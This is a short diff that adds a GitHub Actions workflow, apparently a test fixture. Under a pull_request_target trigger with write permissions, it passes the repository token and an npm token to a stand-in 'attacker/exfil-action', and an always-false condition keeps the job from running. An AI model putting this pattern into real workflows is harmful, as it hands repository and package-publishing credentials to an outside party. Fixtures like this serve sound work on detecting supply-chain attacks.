@@ -1,0 +1,17 @@
+name: action supply chain exfiltration
+
+on: pull_request_target
+
+permissions:
+  contents: write
+
+jobs:
+  delegated-action:
+    if: ${{ false }}
+    runs-on: ubuntu-latest
+    steps:
+      - uses: attacker/exfil-action@v1
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PACKAGE_TOKEN: ${{ secrets.NPM_TOKEN }}
+
